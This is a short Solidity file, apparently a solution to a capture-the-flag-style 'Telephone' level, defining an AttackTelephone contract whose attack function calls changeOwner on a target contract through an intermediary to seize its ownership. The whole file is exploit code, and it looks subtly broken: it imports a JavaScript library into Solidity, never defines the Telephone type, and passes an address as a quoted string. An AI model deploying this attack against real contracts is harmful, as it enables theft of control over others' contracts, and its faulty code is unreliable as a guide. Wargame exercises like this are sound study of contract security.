// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../../node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol";
import { ethers } from '../../../node_modules/ethers';

contract AttackTelephone {

    Telephone public telephoneContract;

    constructor (address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    /// @notice Attack the Telephone Contract
    function attack () public {
        telephoneContract.changeOwner("0x319d567611c5a1017BA081e2B27B7c7b57e1797d");
    }
}